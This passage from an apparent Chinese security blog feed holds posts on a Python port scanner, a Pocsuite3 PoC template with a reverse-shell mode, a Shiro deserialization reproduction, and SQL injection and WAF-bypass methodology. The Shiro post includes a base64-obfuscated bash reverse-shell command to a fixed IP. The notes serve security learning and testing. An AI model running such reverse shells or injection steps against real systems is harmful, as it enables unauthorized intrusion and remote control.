<h2 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h2><p>介绍：多线程模块</p>
<p>使用</p>
<pre class="highlight"><span class="line">import threading							# 导包</span><br><span class="line">t = threading.Thread(target=要执行的函数)		# 设置要开启线程的函数</span><br><span class="line">t.start()									# 开启线程</span><br><span class="line"># linux可直接Ctrl+c结束脚本，Windows下失效</span><br></pre>

<p>守护进程</p>
<pre class="highlight"><span class="line">t = threading.Thread(target=要执行的函数, daemon=True)   # 设置守护进程，父进程结束则结束全部进程</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"># 主线程空循环，防止结束，同时用来接收中断信号</span><br><span class="line">while True:</span><br><span class="line">	pass</span><br><span class="line"># 用于Windows下接收Ctrl+c信号，结束脚本程序。</span><br></pre>

<p>线程锁，防止多个线程同时操作一个资源对象</p>
<pre class="highlight"><span class="line">lock = threading.Lock() 	# 多线程开始之前定义</span><br><span class="line">lock.acquire()				# 获取锁</span><br><span class="line">lock.release()				# 释放锁</span><br></pre>

<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用端口扫描项目，梳理套接字、多线程（守护进程、线程锁）的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import queue</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"># 全局变量，队列，用来依次存储端口号</span><br><span class="line">q = queue.Queue()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def portScan(q):</span><br><span class="line">    while not q.empty():</span><br><span class="line">        port = q.get()</span><br><span class="line">        # 设置套接字连接</span><br><span class="line">        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        # 设置超时重连时间，单位秒，不设置会导致发包速度极慢，默认15秒</span><br><span class="line">        c.settimeout(0.5)</span><br><span class="line">        # connect.ex()会一直尝试连接，连接成功返回0，失败返回错误信息（key值）</span><br><span class="line">        if c.connect_ex((host, port)) == 0:</span><br><span class="line">            print(&quot;%s:%d is open&quot; % (host, port))</span><br><span class="line">            s = host + &quot;:&quot; + str(port)</span><br><span class="line">            # 开启进程锁，多线程写入数据</span><br><span class="line">            lock.acquire()</span><br><span class="line">            with open(&#x27;./ports.txt&#x27;, &#x27;a&#x27;) as fp:</span><br><span class="line">                fp.write(s + &quot;\n&quot;)</span><br><span class="line">                # 释放锁</span><br><span class="line">            lock.release()</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;%s:%d not open&quot; % (host, port))</span><br><span class="line">        # 关闭套接字连接</span><br><span class="line">        c.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 独立执行时的程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    #argv用来接收用户输入，按输入次序分别为argv[0-n],argv[0]表示脚本名</span><br><span class="line">    if len(sys.argv) &lt; 3:</span><br><span class="line">        print(&quot;请以以下格式输入：&quot;)</span><br><span class="line">        print(&quot;python portScan.py ip 线程数&quot;)</span><br><span class="line">    host = sys.argv[1]</span><br><span class="line">    thread_num = int(sys.argv[2])</span><br><span class="line">    # 在进程开始前，定义进程锁，不可在进程中定义锁，否则线程自己使用自己的锁，则失去进程锁的意义</span><br><span class="line">    lock = threading.Lock()</span><br><span class="line"></span><br><span class="line">    for port in range(1, 65536):</span><br><span class="line">        q.put(port)</span><br><span class="line">    for i in range(thread_num):</span><br><span class="line">        # 开启守护进程</span><br><span class="line">        t = threading.Thread(target=portScan, args=[q], daemon=True)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    # 设置主进程死循环，方便接收中断信号</span><br><span class="line">    # 因为设置了守护进程，所以主进程结束，子进程也会立刻结束</span><br><span class="line">    while True:</span><br><span class="line">        pass</span><br></pre>

<h1 id="四、下载"><a href="#四、下载" class="headerlink" title="四、下载"></a>四、下载</h1><p><a href="https://www.zerochen.top/download/Port/PortScan.py">https://www.zerochen.top/download/Port/PortScan.py</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>端口扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>Pocsuite3使用</title>
    <url>/article/Pocsuite3%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h1><pre class="highlight"><span class="line">漏洞应用名_版本号_漏洞类型名称 </span><br></pre>

<p>（所有字母均为小写,所有的符号改成_）</p>
<p>例：</p>
<pre class="highlight"><span class="line">88979_cmseasy_5_5_sql_injection.py</span><br></pre>

<h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><pre class="highlight"><span class="line">#导入所写PoC所需要类/文件，尽量不要使用第三方模块。</span><br><span class="line">#迫不得已使用第三方模块有其依赖规则，后面给出。</span><br><span class="line">from pocsuite3.api import Output,POCBase,register_poc,requests</span><br><span class="line"></span><br><span class="line">#PoC实现类，继承POCBase</span><br><span class="line">class DemoPoc(POCBase):</span><br><span class="line">	#PoC信息字段，需要完整填写全部下列信息</span><br><span class="line">	vulID = &#x27;1000&#x27;  					# ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0</span><br><span class="line">    version = &#x27;1&#x27; 						# 默认为1</span><br><span class="line">    author = &#x27;chen&#x27; 					# PoC作者的大名</span><br><span class="line">    vulDate = &#x27;2014-10-16&#x27; 				# 漏洞公开的时间,不知道就写今天</span><br><span class="line">    createDate = &#x27;2014-10-16&#x27;			# 编写PoC的日期</span><br><span class="line">    updateDate = &#x27;2014-10-16&#x27;			# PoC更新的时间,默认和编写时间一样</span><br><span class="line">    references = [&#x27;https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html&#x27;]</span><br><span class="line">    									# 漏洞地址来源,0day不用写</span><br><span class="line">    name = &#x27;Drupal 7.x /includes/database/database.inc SQL注入漏洞 PoC&#x27;			# PoC名称</span><br><span class="line">    appPowerLink = &#x27;https://www.drupal.org/&#x27;			# 漏洞厂商主页地址</span><br><span class="line">    appName = &#x27;Drupal&#x27;									# 漏洞应用名称</span><br><span class="line">    appVersion = &#x27;7.x&#x27;									# 漏洞影响版本</span><br><span class="line">    vulType = &#x27;SQL Injection&#x27;							# 漏洞类型,类型参考见 漏洞类型规范表</span><br><span class="line">    desc = &#x27;&#x27;&#x27;</span><br><span class="line">    	漏洞简要描述</span><br><span class="line">    &#x27;&#x27;&#x27; </span><br><span class="line">    samples = []										# 测试样列,就是用 PoC 测试成功的网站</span><br><span class="line">    install_requires = [] 	# PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写</span><br><span class="line">    #第三方插件需再此处注明</span><br><span class="line">   	# 整个字段的值为list，每个项为一个依赖模块</span><br><span class="line">   	# install_requires =[str_item_,str_item,…] </span><br><span class="line">   	# 如果遇到安装时模块名与调用时的不一致情况，用:分割开</span><br><span class="line">   	# 例如常见的加密算法库pycryptodome,但是调用是以from Crypto.Cipher import AES,此时就需要如下填写</span><br><span class="line">	# install_requires = [&#x27;pycryptodome:Crypto&#x27;]</span><br><span class="line">   	pocDesc = &#x27;&#x27;&#x27; </span><br><span class="line">   		poc的用法描述 </span><br><span class="line">   	&#x27;&#x27;&#x27;</span><br><span class="line">   	</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"> 	#编写验证模式</span><br><span class="line">	def _verify(self):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        # 验证代码</span><br><span class="line">        if x:</span><br><span class="line">        	result[&#x27;VerifyInfo&#x27;]=&#123;&#125;</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = target</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;Postdata&#x27;] = payload</span><br><span class="line">            ...</span><br><span class="line">        return self.parse_output(result)		# 必须返回result</span><br><span class="line">     </span><br><span class="line">    #编写攻击模式</span><br><span class="line">    #若没有攻击模式，直接写return self._verify()即可</span><br><span class="line">    def _attack(self):</span><br><span class="line">    	output = Output(self)</span><br><span class="line">    	result = &#123;&#125;</span><br><span class="line">    	# 攻击代码</span><br><span class="line">    	if x:</span><br><span class="line">        	result[&#x27;VerifyInfo&#x27;]=&#123;&#125;</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = target</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;Postdata&#x27;] = payload</span><br><span class="line">            ...</span><br><span class="line">        return self.parse_output(result)		# 必须返回result</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    #编写shell模式</span><br><span class="line">    def _shell(self):</span><br><span class="line">    	cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())</span><br><span class="line">    	# 攻击代码 execute cmd</span><br><span class="line">    </span><br><span class="line">    #自定义输出函数，调用框架输出的实例Output</span><br><span class="line">	def parse_output(self,result):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        if result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        else:</span><br><span class="line">            output.fail(&#x27;target is not vulnerable&#x27;)</span><br><span class="line">        return output</span><br><span class="line"></span><br><span class="line">register_poc(DemoPoc)</span><br></pre>

<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><pre class="highlight"><span class="line"># 使用test.py这个PoC去检测http://test.com这个url</span><br><span class="line">pocsuite -u http://test.com -r test.py --verify </span><br><span class="line"></span><br><span class="line"># shell 反弹模式</span><br><span class="line">pocsuite -u http://test.com -r test.py --verify --shell </span><br><span class="line"></span><br><span class="line"># pocsuite3中自带的ecshop poc中实现了自定义命令`command`,可以从外部参数传递</span><br><span class="line">pocsuite -u http://test.com -r ecshop_rce.py --attack --command &quot;whoami&quot; </span><br><span class="line"></span><br><span class="line">#使用test.py这个PoC去检测url.txt文件里所有的url</span><br><span class="line">pocsuite -f url.txt -r test.py --verify </span><br></pre>

<h1 id="Result结果参数说明"><a href="#Result结果参数说明" class="headerlink" title="Result结果参数说明"></a>Result结果参数说明</h1><pre class="highlight"><span class="line">result：[</span><br><span class="line">    &#123;  name: &#x27;DBInfo&#x27;，        value：&#x27;数据库内容&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value: &#x27;管理员用户名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value：&#x27;管理员密码&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Salt&#x27;，          value: &#x27;加密盐值&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Uid&#x27;，           value: &#x27;用户ID&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Groupid&#x27;，       value: &#x27;用户组ID&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;ShellInfo&#x27;，     value: &#x27;Webshell信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;Webshell地址&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Content&#x27;，       value: &#x27;Webshell内容&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;FileInfo&#x27;，      value: &#x27;文件信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Filename&#x27;，      value: &#x27;文件名称&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Content&#x27;，       value: &#x27;文件内容&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;XSSInfo&#x27;，       value: &#x27;跨站脚本信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;验证URL&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Payload&#x27;，       value: &#x27;验证Payload&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;AdminInfo&#x27;，     value: &#x27;管理员信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Uid&#x27;，           value: &#x27;管理员ID&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value: &#x27;管理员用户名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value: &#x27;管理员密码&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;Database&#x27;，      value：&#x27;数据库信息&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Hostname&#x27;，      value: &#x27;数据库主机名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value：&#x27;数据库用户名&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value: &#x27;数据库密码&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;DBname&#x27;，        value: &#x27;数据库名&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;VerifyInfo&#x27;，    value: &#x27;验证信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Target&#x27;，        value: &#x27;验证host:port&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;验证URL&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Postdata&#x27;，      value: &#x27;验证POST数据&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Path&#x27;，          value: &#x27;网站绝对路径&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;SiteAttr&#x27;，      value: &#x27;网站服务器信息&#x27;&#125;,</span><br><span class="line">    &#123;  name: &#x27;Process&#x27;，       value: &#x27;服务器进程&#x27;&#125;</span><br><span class="line"></span><br><span class="line">    ]</span><br></pre>

<h1 id="通用方法"><a href="#通用方法" class="headerlink" title="通用方法"></a>通用方法</h1><table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">from pocsuite3.api import logger</td>
<td align="left">日志记录，比如logger.log(info)</td>
</tr>
<tr>
<td align="left">from pocsuite3.api import requests</td>
<td align="left">请求类，用法同 requests</td>
</tr>
<tr>
<td align="left">from pocsuite3.api import Seebug</td>
<td align="left">Seebug api 调用</td>
</tr>
<tr>
<td align="left">from pocsuite3.api import ZoomEye</td>
<td align="left">ZoomEye api 调用</td>
</tr>
<tr>
<td align="left">from pocsuite3.api import CEye</td>
<td align="left">Ceye api 调用</td>
</tr>
<tr>
<td align="left">from pocsuite3.api import crawl</td>
<td align="left">简单爬虫功能</td>
</tr>
<tr>
<td align="left">from pocsuite3.api import PHTTPServer</td>
<td align="left">Http服务功能</td>
</tr>
<tr>
<td align="left">from pocsuite3.api import REVERSE_PAYLOAD</td>
<td align="left">反向连接shell payload</td>
</tr>
<tr>
<td align="left">from pocsuite3.api import get_results</td>
<td align="left">获取结果</td>
</tr>
</tbody></table>
<h1 id="漏洞类型规范"><a href="#漏洞类型规范" class="headerlink" title="漏洞类型规范"></a>漏洞类型规范</h1><table>
<thead>
<tr>
<th align="left">英文名称</th>
<th align="left">中文名称</th>
<th align="left">缩写</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Cross Site Scripting</td>
<td align="left">跨站脚本</td>
<td align="left">xss</td>
</tr>
<tr>
<td align="left">Cross Site Request Forgery</td>
<td align="left">跨站请求伪造</td>
<td align="left">csrf</td>
</tr>
<tr>
<td align="left">SQL Injection</td>
<td align="left">Sql注入</td>
<td align="left">sql-inj</td>
</tr>
<tr>
<td align="left">LDAP Injection</td>
<td align="left">ldap注入</td>
<td align="left">ldap-inj</td>
</tr>
<tr>
<td align="left">Mail Command Injection</td>
<td align="left">邮件命令注入</td>
<td align="left">smtp-inj</td>
</tr>
<tr>
<td align="left">Null Byte Injection</td>
<td align="left">空字节注入</td>
<td align="left">null-byte-inj</td>
</tr>
<tr>
<td align="left">CRLF Injection</td>
<td align="left">CRLF注入</td>
<td align="left">crlf-inj</td>
</tr>
<tr>
<td align="left">SSI Injection</td>
<td align="left">Ssi注入</td>
<td align="left">ssi-inj</td>
</tr>
<tr>
<td align="left">XPath Injection</td>
<td align="left">Xpath注入</td>
<td align="left">xpath-inj</td>
</tr>
<tr>
<td align="left">XML Injection</td>
<td align="left">Xml注入</td>
<td align="left">xml-inj</td>
</tr>
<tr>
<td align="left">XQuery Injection</td>
<td align="left">Xquery 注入</td>
<td align="left">xquery-inj</td>
</tr>
<tr>
<td align="left">Command Execution</td>
<td align="left">命令执行</td>
<td align="left">cmd-exec</td>
</tr>
<tr>
<td align="left">Code Execution</td>
<td align="left">代码执行</td>
<td align="left">code-exec</td>
</tr>
<tr>
<td align="left">Remote File Inclusion</td>
<td align="left">远程文件包含</td>
<td align="left">rfi</td>
</tr>
<tr>
<td align="left">Local File Inclusion</td>
<td align="left">本地文件包含</td>
<td align="left">lfi</td>
</tr>
<tr>
<td align="left">Abuse of Functionality</td>
<td align="left">功能函数滥用</td>
<td align="left">func-abuse</td>
</tr>
<tr>
<td align="left">Brute Force</td>
<td align="left">暴力破解</td>
<td align="left">brute-force</td>
</tr>
<tr>
<td align="left">Buffer Overflow</td>
<td align="left">缓冲区溢出</td>
<td align="left">buffer-overflow</td>
</tr>
<tr>
<td align="left">Content Spoofing</td>
<td align="left">内容欺骗</td>
<td align="left">spoofing</td>
</tr>
<tr>
<td align="left">Credential Prediction</td>
<td align="left">证书预测</td>
<td align="left">credential-prediction</td>
</tr>
<tr>
<td align="left">Session Prediction</td>
<td align="left">会话预测</td>
<td align="left">session-prediction</td>
</tr>
<tr>
<td align="left">Denial of Service</td>
<td align="left">拒绝服务</td>
<td align="left">dos</td>
</tr>
<tr>
<td align="left">Fingerprinting</td>
<td align="left">指纹识别</td>
<td align="left">finger</td>
</tr>
<tr>
<td align="left">Format String</td>
<td align="left">格式化字符串</td>
<td align="left">format-string</td>
</tr>
<tr>
<td align="left">HTTP Response Smuggling</td>
<td align="left">http响应伪造</td>
<td align="left">http-response-smuggling</td>
</tr>
<tr>
<td align="left">HTTP Response Splitting</td>
<td align="left">http响应拆分</td>
<td align="left">http-response-splitting</td>
</tr>
<tr>
<td align="left">HTTP Request Splitting</td>
<td align="left">http请求拆分</td>
<td align="left">http-request-splitting</td>
</tr>
<tr>
<td align="left">HTTP Request Smuggling</td>
<td align="left">http请求伪造</td>
<td align="left">http-request-smuggling</td>
</tr>
<tr>
<td align="left">HTTP Parameter Pollution</td>
<td align="left">http参数污染</td>
<td align="left">hpp</td>
</tr>
<tr>
<td align="left">Integer Overflows</td>
<td align="left">整数溢出</td>
<td align="left">int-overflow</td>
</tr>
<tr>
<td align="left">Predictable Resource Location</td>
<td align="left">可预测资源定位</td>
<td align="left">res-location</td>
</tr>
<tr>
<td align="left">Session Fixation</td>
<td align="left">会话固定</td>
<td align="left">session-fixation</td>
</tr>
<tr>
<td align="left">URL Redirector Abuse</td>
<td align="left">url重定向</td>
<td align="left">redirect</td>
</tr>
<tr>
<td align="left">Privilege Escalation</td>
<td align="left">权限提升</td>
<td align="left">privilege-escalation</td>
</tr>
<tr>
<td align="left">Resolve Error</td>
<td align="left">解析错误</td>
<td align="left">resolve-error</td>
</tr>
<tr>
<td align="left">Arbitrary File Creation</td>
<td align="left">任意文件创建</td>
<td align="left">file-creation</td>
</tr>
<tr>
<td align="left">Arbitrary File Download</td>
<td align="left">任意文件下载</td>
<td align="left">file-download</td>
</tr>
<tr>
<td align="left">Arbitrary File Deletion</td>
<td align="left">任意文件删除</td>
<td align="left">file-deletion</td>
</tr>
<tr>
<td align="left">Backup File Found</td>
<td align="left">备份文件发现</td>
<td align="left">bak-file-found</td>
</tr>
<tr>
<td align="left">Database Found</td>
<td align="left">数据库发现</td>
<td align="left">db-found</td>
</tr>
<tr>
<td align="left">Directory Listing</td>
<td align="left">目录遍历</td>
<td align="left">dir-listing</td>
</tr>
<tr>
<td align="left">Directory Traversal</td>
<td align="left">目录穿越</td>
<td align="left">dir-traversal</td>
</tr>
<tr>
<td align="left">File Upload</td>
<td align="left">文件上传</td>
<td align="left">file-upload</td>
</tr>
<tr>
<td align="left">Login Bypass</td>
<td align="left">登录绕过</td>
<td align="left">login-bypass</td>
</tr>
<tr>
<td align="left">Weak Password</td>
<td align="left">弱密码</td>
<td align="left">weak-pass</td>
</tr>
<tr>
<td align="left">Remote Password Change</td>
<td align="left">远程密码修改</td>
<td align="left">remote-pass-change</td>
</tr>
<tr>
<td align="left">Code Disclosure</td>
<td align="left">代码泄漏</td>
<td align="left">code-disclosure</td>
</tr>
<tr>
<td align="left">Path Disclosure</td>
<td align="left">路径泄漏</td>
<td align="left">path-disclosure</td>
</tr>
<tr>
<td align="left">Information Disclosure</td>
<td align="left">信息泄漏</td>
<td align="left">info-disclosure</td>
</tr>
<tr>
<td align="left">Security Mode Bypass</td>
<td align="left">安全模式绕过</td>
<td align="left">sec-bypass</td>
</tr>
<tr>
<td align="left">Malware</td>
<td align="left">挂马</td>
<td align="left">mal</td>
</tr>
<tr>
<td align="left">Black Link</td>
<td align="left">暗链</td>
<td align="left">black-link</td>
</tr>
<tr>
<td align="left">Backdoor</td>
<td align="left">后门</td>
<td align="left">backdoor</td>
</tr>
<tr>
<td align="left">Unauthorized access</td>
<td align="left">未授权访问</td>
<td align="left">Unauthorized access</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Pocsuite</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro反序列化漏洞复现</title>
    <url>/article/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="1、探测"><a href="#1、探测" class="headerlink" title="1、探测"></a>1、探测</h1><p>在登录界面回包中，有rememberMe=deleteMe参数，说明使用Shiro反序列化。</p>
<h1 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h1><p>a、使用shiroExploit工具检测，反弹shell</p>
<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>

<p>b、使用xray检测，直接发送payload</p>
<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --html-output 1.html</span><br></pre>

<p>或指定脚本检测</p>
<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --plugins shiro --html-output 1.html</span><br></pre>

<p>将发包贴入burpsuite发包，将Testecho: namzzg修改为Testcmd:ls即可执行对应指令，也可反弹shell，语句同上</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入思路整理</title>
    <url>/article/SQL%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>本篇只介绍思路，不做详细注入语句讲解。</p>
<h1 id="二、SQL注入产生原因"><a href="#二、SQL注入产生原因" class="headerlink" title="二、SQL注入产生原因"></a>二、SQL注入产生原因</h1><p>用户输入处理不当，用户数据被当做SQL语句执行。</p>
<h1 id="三、注入类型"><a href="#三、注入类型" class="headerlink" title="三、注入类型"></a>三、注入类型</h1><table>
<thead>
<tr>
<th align="left">分类标准</th>
<th align="left">分类</th>
</tr>
</thead>
<tbody><tr>
<td align="left">根据请求方式分类</td>
<td align="left">GET方式注入 POST方式注入</td>
</tr>
<tr>
<td align="left">根据注入点参数分类</td>
<td align="left">整数型注入 字符型注入 搜索型注入</td>
</tr>
<tr>
<td align="left">根据反馈类型分类</td>
<td align="left">union联合查询注入 报错注入 布尔盲注 时间盲注 其他类型 （如请求头注入、内联注入、二次编码注入、宽字节注入、堆叠注入、二阶注入等）</td>
</tr>
<tr>
<td align="left">根据数据库类型分类</td>
<td align="left">Mysql、MSSql、Oracle、Access、MongoDB等</td>
</tr>
</tbody></table>
<h1 id="四、SQL注入思路"><a href="#四、SQL注入思路" class="headerlink" title="四、SQL注入思路"></a>四、SQL注入思路</h1><h2 id="1、发现注入点"><a href="#1、发现注入点" class="headerlink" title="1、发现注入点"></a>1、发现注入点</h2><p><strong>注入点</strong></p>
<p>所有存在<strong>可变参数</strong>且<strong>代入数据</strong>库中执行的数据</p>
<p>如：url中的?id=、页面中的搜索框、POST数据包中的可变参数、数据头中的UA、X-Forward-For等</p>
<p><strong>判断：</strong></p>
<p>在参数后加单引号、双引号、斜杠<code>&#39;、&quot;、\</code>，全部加。</p>
<p>若页面异常，则可能存在注入；</p>
<p>若页面无变化，则使用延时函数，判断是否存在时间延时盲注（各大数据库通用）；其中，在mysql数据库中，需要额外判断宽字节注入、二次编码注入。若页面存在延时刷新、报错，可能存在sql注入。</p>
<h2 id="2、判断闭合符"><a href="#2、判断闭合符" class="headerlink" title="2、判断闭合符"></a>2、判断闭合符</h2><p>使用不报错的闭合符（<code>&#39;或&quot;</code>）,加上注释符（不同数据库不同，但<code>-- a</code>几乎可以通用：mysql中为–空格,mssql和oracle为–，access无注释符号）</p>
<p>注意：</p>
<p>mysql为<code>?id=1&#39; -- a</code>形式</p>
<p>mssql、oracle、access均为<code>?id=1&#39; and 1=1/1=2 --</code>形式（1=1正常、1=2异常）</p>
<p>若页面返回正常，则单或双引号即为闭合符；若页面依然异常，则在单或双引号后添加<code>)</code>，直至页面恢复正常。添加部分与单或双引号组成闭合符。</p>
<p>注意：需要结合语境，判断可能使用的sql语句，更加容易判断闭合符。如搜索型语句处（多存在搜索框处），可能会使用like关键词，需要使用%闭合，构造形如<code>%&#39;and &#39;%&#39;=&#39;</code>的闭合语句进行闭合判断。</p>
<h2 id="3、判断数据库类型"><a href="#3、判断数据库类型" class="headerlink" title="3、判断数据库类型"></a>3、判断数据库类型</h2><p>在进行注入前，需要判断数据库类型，从而选择合适的注入语句。使用每个数据库独有的一个或多个语法、函数进行判断。</p>
<p>简单列举，够用即可。</p>
<table>
<thead>
<tr>
<th align="left">数据库类型</th>
<th align="left">注释</th>
<th align="left">函数</th>
</tr>
</thead>
<tbody><tr>
<td align="left">mysql</td>
<td align="left">– a</td>
<td align="left">version()、@@version、length()</td>
</tr>
<tr>
<td align="left">mssql</td>
<td align="left">–</td>
<td align="left">@@version、len()、?id=1’ and exists (select * from sysobjects)&gt;0 – 返回正常</td>
</tr>
<tr>
<td align="left">oracle</td>
<td align="left">–</td>
<td align="left">banner from sys.v_$version、length()</td>
</tr>
<tr>
<td align="left">access</td>
<td align="left">无</td>
<td align="left">and exists (select * from msysobjects)&gt;0 返回正常</td>
</tr>
</tbody></table>
<p>注：注释处为两个英文输入法的短横杠，非单横杠（显示问题）</p>
<h2 id="4、选择注入方式"><a href="#4、选择注入方式" class="headerlink" title="4、选择注入方式"></a>4、选择注入方式</h2><p>根据页面回显情况，选择通用注入方式：</p>
<p>1&gt;首选union联合查询。要求：有回显位。</p>
<p>2&gt;次选报错注入。要求：页面异常为报错信息。</p>
<p>3&gt;最后是盲注。若页面只有正常和单一异常两种回显，选择布尔盲注；若页面无回显，选择时间盲注。</p>
<h2 id="5、结合WAF确定注入语句"><a href="#5、结合WAF确定注入语句" class="headerlink" title="5、结合WAF确定注入语句"></a>5、结合WAF确定注入语句</h2><p>结合4，同一处注入点可以有多重注入手法，若是没有waf，按照优先级进行选择即可。若是有waf，需要结合绕waf选择注入方式。同时，在判断时，也可以尝试绕waf。</p>
<p>1&gt;首先，判断and、or、空格是否存在waf拦截。</p>
<p>2&gt;然后，按照注入手法优先级，将用到的关键词（如：order by、union select等）单独放入注入语句进行判断。</p>
<p><strong>优先绕过waf，其次换可替代的关键词、最后换注入方式</strong>。</p>
<p>3&gt;最后，根据waf拦截方式，确定注入语句，依次注出当前数据库名、表名、字段名、数据即可。文末附上常见绕waf方式。</p>
<p>注意：</p>
<p>若为mysql数据库，可进行以下判断</p>
<pre class="highlight"><span class="line">--os-shell可对网站进行getshell，但是存在以下前提条件</span><br><span class="line">1、存在sql注入</span><br><span class="line">2、知道网站绝对路径</span><br><span class="line">3、拥有数据库权限（dba权限），也可以使用sqlmap的--is-dba判断</span><br><span class="line">4、数据库配置文件secure_file_priv未设置或设置为可读写的已知路径</span><br></pre>

<p>4&gt;其他：</p>
<p>时间延时盲注可用DNS外带节省注入时间，放在其他文章中再做讲述。</p>
<h1 id="五、SQL注入防御"><a href="#五、SQL注入防御" class="headerlink" title="五、SQL注入防御"></a>五、SQL注入防御</h1><table>
<thead>
<tr>
<th align="left">方式</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">去掉单引号</td>
<td align="left">现实场景常用单引号，去掉不合实际</td>
</tr>
<tr>
<td align="left">转义单引号</td>
<td align="left">对数字型无效（数字型不需要引号） 斜杠转义 addslashes()函数转义 php.ini配置文件转义（5.6以下版本开启magic_quotes_gpc = On）</td>
</tr>
<tr>
<td align="left">强制类型转换</td>
<td align="left">针对数字型 intval()</td>
</tr>
<tr>
<td align="left">更改数据库连接方式</td>
<td align="left">POD连接数据库将变量转换成字符串，再写入数据库，无法拼接</td>
</tr>
</tbody></table>
<h1 id="六、WAF绕过"><a href="#六、WAF绕过" class="headerlink" title="六、WAF绕过"></a>六、WAF绕过</h1><p>sql语法特性 + http特性 + waf缺陷 = waf绕过</p>
